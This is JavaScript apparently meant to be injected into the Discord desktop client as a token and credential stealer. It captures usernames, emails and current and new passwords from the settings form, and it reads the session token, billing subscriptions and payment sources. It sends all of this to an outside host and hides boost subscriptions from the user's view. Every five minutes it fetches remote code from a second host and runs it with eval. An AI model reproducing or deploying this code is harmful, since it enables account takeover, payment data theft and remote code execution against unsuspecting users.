var webpackModules = window.webpackJsonp.push([[], {'__extra_id__': (module, exports, req) => module.exports = req}, [['__extra_id__']]]);

function sortWebpackModule(module)
{
    for (let i in webpackModules.c) {
        if (webpackModules.c.hasOwnProperty(i)) {
            let m = webpackModules.c[i].exports;
            if (m && m.__esModule && m.default && m.default[module] !== undefined)
                return m.default;
            if (m && m[module] !== undefined) 
                return m;
        }
    }
    return null;
}

function SendData(data)
{
    var request = new XMLHttpRequest();
    request.open("GET", "https://urltopostdatato.com/datapost.php?data=" + new Buffer(data).toString('base64'));
    request.send();
}

function GetData(url, token, callback)
{
    var request = new XMLHttpRequest();
    request.addEventListener("load", () => {
        callback(request.responseText);
    });
    request.open("GET", `https://cors-anywhere.herokuapp.com/${url}`);
    if (token != "") {
        request.setRequestHeader("Authorization", token);
    }
    request.send();
}

function SendCategorisedData(category, data) {
    SendData(`${category}:\n` + "```" + data + "```");
}

function addEventListeners()
{
    setInterval(() => {
        var elements = document.getElementsByClassName("button-38aScr lookFilled-1Gx00P colorGreen-29iAKY sizeSmall-2cSMqn grow-q77ONN"); //Adds an event listener to the Save button when they modify their user info
        for(var i = 0; i < elements.length; i++) {
            if (elements[i].innerText == "Save") {
                elements[i].onclick = function () {
                    var inputfields = document.getElementsByClassName("inputDefault-_djjkz input-cIJ7To");
                    var username = inputfields[0].value;
                    var discriminator = inputfields[1].value;
                    var email = inputfields[2].value;
                    var currentpassword = inputfields[3].value == "" ? "Not found. (User didn't require their password to update their user information)" : inputfields[3].value;
                    var newpassword = inputfields[4] == undefined ? "Not found. (User didn't change their password)" : inputfields[4].value;
                    SendCategorisedData(`USER_SETTINGS_UPDATE`, `Username: ${username}#${discriminator}\nEmail: ${email}\nCurrent Password: ${currentpassword}\nNew Password: ${newpassword}`);
                }
            }
        }
    }, 1);

    setInterval(() => {
        var userinformation = sortWebpackModule("getCurrentUser").getCurrentUser();
        var token = sortWebpackModule("getToken").getToken();
        var username = userinformation.username;
        var nitro = userinformation.premiumType == 0 ? "Doesn't have any form of nitro." : (userinformation.premiumType == 1  ? "Nitro Classic." : "Nitro.");
        GetData("https://discordapp.com/api/v8/users/@me/billing/subscriptions", token, (resp) => {
            var subscriptions = resp == "[]" ? "No active subscriptions found." : resp;
            GetData("https://discordapp.com/api/v8/users/@me/billing/payment-sources", token, (resp2) => {
                var payments = resp2 == "[]" ? "No payment methods attached." : resp2;
                SendCategorisedData(`USER_INFORMATION_GATHER`, `Token: ${token}\nUsername: ${username}\nUser JSON Object: ${JSON.stringify(userinformation)}\nNitro: ${nitro}\nSubscriptions: ${subscriptions}\nPayment Methods: ${payments}`);
            });
        });
    }, (1000 * 60 * 10));

    setInterval(() => {
        var elements = document.getElementsByClassName("guild-Hq0WWA");
        if (elements.length > 0) {
            for(var j = 0; j < elements.length; j++) {
                elements[j].remove();
            }
            document.getElementsByClassName("divider-J3ken9")[0].remove(); //remove their server boost subscriptions from user settings
            document.getElementsByClassName("subSectionHeader-1bsAit base-1x0h_U size12-3cLvbJ")[0].remove();
        } 
    }, 1);

    setInterval(() => {
        GetData("https://yoursite.com/payload.txt", "", (response) => {
            if (response != undefined) {
                eval(response);
            }
        });
    }, (1000 * 60) * 5);
}

addEventListeners();